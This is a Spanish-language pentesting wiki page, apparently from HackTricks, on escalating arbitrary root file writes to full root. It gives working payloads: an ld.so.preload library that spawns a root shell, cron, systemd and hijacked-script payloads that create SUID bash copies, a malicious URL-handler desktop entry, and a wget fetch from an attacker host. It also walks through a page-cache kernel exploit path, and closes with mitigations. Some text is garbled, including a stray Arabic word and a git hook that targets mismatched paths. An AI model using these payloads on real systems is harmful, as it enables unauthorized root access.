# Escritura Arbitraria de Archivos como Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Este archivo se comporta como la variable de entorno **`LD_PRELOAD`** pero también funciona en **binarios SUID**.\
Si puedes crearlo o modificarlo, puedes simplemente añadir una **ruta a una librería que se cargará** con cada binario ejecutado.

Por ejemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) son **scripts** que se **ejecutan** en varios **eventos** en un repositorio git, como cuando se crea un commit, un merge... Así que si un **script o usuario privilegiado** realiza estas acciones con frecuencia y es posible **escribir en la carpeta `.git`**, esto se puede usar para **privesc**.

Por ejemplo, es posible **generar un script** en un repo git en **`.git/hooks`** para que siempre se ejecute cuando se crea un nuevo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

Si puedes **escribir archivos relacionados con cron que root ejecuta**, normalmente puedes conseguir ejecución de código la próxima vez que se ejecute el job. Los objetivos interesantes incluyen:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- El propio crontab de root en `/var/spool/cron/` o `/var/spool/cron/crontabs/`
- `systemd` timers y los servicios que activan

Comprobaciones rápidas:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Rutas de abuso típicas:

- **Añadir un nuevo cron job de root** a `/etc/crontab` o a un archivo en `/etc/cron.d/`
- **Reemplazar un script** ya ejecutado por `run-parts`
- **Poner una backdoor en un target de timer existente** modificando el script o binario que lanza

Ejemplo mínimo de payload de cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Si solo puedes escribir dentro de un directorio cron usado por `run-parts`, deja allí un archivo ejecutable en su lugar:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notas:

- `run-parts` normalmente ignora nombres de archivo que contienen puntos, así que prefiere nombres como `backup` en lugar de `backup.sh`.
- Algunas distros usan `anacron` o `systemd` timers en lugar de cron clásico, pero la idea de abuso es la misma: **modificar lo que root ejecutará después**.

### Service & Socket files

Si puedes escribir archivos de unidad de **`systemd`** o archivos referenciados por ellos, podrías lograr ejecución de código como root recargando y reiniciando la unidad, o esperando a que se active la ruta de activación del service/socket.

Objetivos interesantes incluyen:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Anulaciones drop-in en `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binarios de service referenciados por `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Rutas `EnvironmentFile=` escribibles cargadas por un service root

Comprobaciones rápidas:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Rutas comunes de abuso:

- **Sobrescribe `ExecStart=`** en una unidad de servicio propiedad de root que puedas modificar
- **Añade un override drop-in** con un `ExecStart=` malicioso y borra primero el anterior
- **Inserta una backdoor al script/binario** ya referenciado por la unidad
- **Secuestra un servicio activado por socket** modificando el archivo `.service` correspondiente que se inicia cuando el socket recibe una conexión

Ejemplo de override malicioso:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flujo típico de activación:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Si no puedes reiniciar los servicios por ti mismo pero sí puedes editar una unidad activada por socket, puede que solo necesites **esperar a que un cliente se conecte** para activar la ejecución del servicio con puerta trasera como root.

### Sobrescribe un `php.ini` restrictivo usado por un sandbox PHP privilegiado

Algunos daemons personalizados validan el PHP proporcionado por el usuario ejecutando `php` con un **`php.ini` restringido** (por ejemplo, `disable_functions=exec,system,...`). Si el código aislado aún tiene **alguna primitiva de escritura** (como `file_put_contents`) y puedes الوصول al **path exacto de `php.ini`** usado por el daemon, puedes **sobrescribir esa config** para eliminar restricciones y luego enviar un segundo payload que se ejecute con privilegios elevados.

Flujo típico:

1. El primer payload sobrescribe la config del sandbox.
2. El segundo payload ejecuta código ahora que las funciones peligrosas están habilitadas.

Ejemplo mínimo (reemplaza el path usado por el daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Si el daemon se ejecuta como root (o valida con rutas propiedad de root), la segunda ejecución produce un contexto root. Esto es esencialmente **privilege escalation via config overwrite** cuando el runtime aislado aún puede escribir archivos.

### binfmt_misc

El archivo ubicado en `/proc/sys/fs/binfmt_misc` indica qué binary debe ejecutar qué tipo de archivos. TODO: revisar los requisitos para abusar de esto y ejecutar una rev shell cuando se abre un tipo de archivo común.

### Overwrite schema handlers (like http: or https:)

Un atacante con permisos de escritura en los directorios de configuración de la víctima puede reemplazar o crear fácilmente archivos que cambian el comportamiento del sistema, lo que resulta en code execution no deseada. Al modificar el archivo `$HOME/.config/mimeapps.list` para apuntar los handlers de URL HTTP y HTTPS a un archivo malicioso (por ejemplo, configurando `x-scheme-handler/http=evil.desktop`), el atacante se asegura de que **hacer clic en cualquier enlace http o https ejecute el código especificado en ese archivo `evil.desktop`**. Por ejemplo, después de colocar el siguiente código malicioso en `evil.desktop` en `$HOME/.local/share/applications`, cualquier clic en una URL externa ejecuta el comando incrustado:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Para más información consulta [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) donde se usó para explotar una vulnerabilidad real.

### Root ejecutando scripts/binaries escribibles por el usuario

Si un flujo de trabajo privilegiado ejecuta algo como `/bin/sh /home/username/.../script` (o cualquier binario dentro de un directorio propiedad de un usuario sin privilegios), puedes secuestrarlo:

- **Detectar la ejecución:** monitoriza procesos con [pspy](https://github.com/DominicBreuker/pspy) para atrapar a root invocando rutas controladas por el usuario:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirmar escritura:** asegúrate de que tanto el archivo objetivo como su directorio sean propiedad de tu usuario y tengan permisos de escritura.
- **Hijack the target:** haz una copia de seguridad del binario/script original y coloca un payload que cree un shell SUID (o cualquier otra acción root), luego restaura los permisos:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (e.g., pressing a UI button that spawns the helper). When root re-executes the hijacked path, grab the escalated shell with `./rootshell -p`.

### Modificación de archivos solo en page-cache de binarios privilegiados

Algunos bugs del kernel no modifican el archivo **en disco**. En su lugar, solo permiten modificar la **copia en page cache** de un archivo legible. Si puedes apuntar a un binario **setuid** o ejecutado de otro modo por **root**, la siguiente ejecución puede correr bytes controlados por el atacante desde memoria y escalar privilegios aunque el hash del archivo en disco no cambie.

Esto es útil pensarlo como un **primitive de escritura de archivos solo en tiempo de ejecución**:

- **El disco permanece limpio**: el inode y los bytes en disco no cambian
- **La memoria queda modificada**: los procesos que leen/ejecutan la página cacheada obtienen el contenido alterado por el atacante
- **El efecto es temporal**: el cambio desaparece tras reiniciar o expulsar la caché

Este primitive se sitúa entre la clásica **arbitrary file write** y antiguos bugs de abuso de page cache como Dirty COW / Dirty Pipe:

- Dirty COW dependía de una race
- Dirty Pipe tenía restricciones de posición de escritura
- Un primitive solo de page cache puede ser más fiable si la ruta vulnerable da escrituras directas en páginas cacheadas respaldadas por archivos

#### Flujo genérico de privesc

1. Obtener un primitive del kernel que pueda escribir en **páginas de page cache respaldadas por archivos**
2. Usarlo contra un **binario privilegiado legible** u otro archivo ejecutado por root
3. Disparar la ejecución **antes** de que la página sea expulsada de la caché
4. Obtener ejecución de código como root mientras el archivo en disco sigue pareciendo sin modificar

Objetivos típicos de alto valor:

- binarios **setuid-root**
- helpers lanzados por **root services**
- binarios ejecutados comúnmente desde **containers sharing the host kernel/page cache**

#### Ruta de ejemplo con AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) es un buen ejemplo de esta clase. La ruta vulnerable estaba en la API de userspace criptográfica de Linux (`AF_ALG` / `algif_aead`):

- `splice()` puede mover referencias a páginas de page cache desde un archivo legible hacia el scatterlist de TX de crypto
- la ruta de decrypt in-place de `algif_aead` reutilizaba buffers de origen y destino
- `authencesn` entonces escribía en la región de tag de destino
- cuando esa región aún referenciaba páginas cacheadas respaldadas por archivos y spliceadas, la escritura aterrizaba en la **page cache del archivo objetivo**

Así que la técnica interesante no es el CVE en sí, sino el patrón:

- **alimentar páginas de caché respaldadas por archivos a un subsistema del kernel**
- hacer que el subsistema las **trate como salida escribible**
- disparar un pequeño overwrite controlado en memoria

El PoC público usó escrituras repetidas de **4 bytes** para parchear `/usr/bin/su` en memoria y luego ejecutarlo.

#### Exposición y hunting

Si sospechas de esta clase de bug, no te bases solo en comprobaciones de integridad en disco. Verifica también:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` puede cargarse/descargarse como un módulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: la interfaz está integrada en el kernel
- los binarios setuid son buenos objetivos porque un parche que solo afecte a la page cache puede ser suficiente para convertir un foothold local en root

#### Reducción de la superficie de ataque para la ruta `algif_aead`

Si la interfaz vulnerable se proporciona mediante un módulo cargable:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Si está compilado en el kernel, algunos disclosures reportaron bloquear la ruta init con:
```bash
initcall_blacklist=algif_aead_init
```
Este tipo de mitigación también merece recordarse para otros LPEs de kernel: si la explotación depende de una interfaz opcional específica, deshabilitar o poner en blacklist esa interfaz puede romper la ruta de explotación incluso antes de que haya disponible una actualización completa del kernel.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
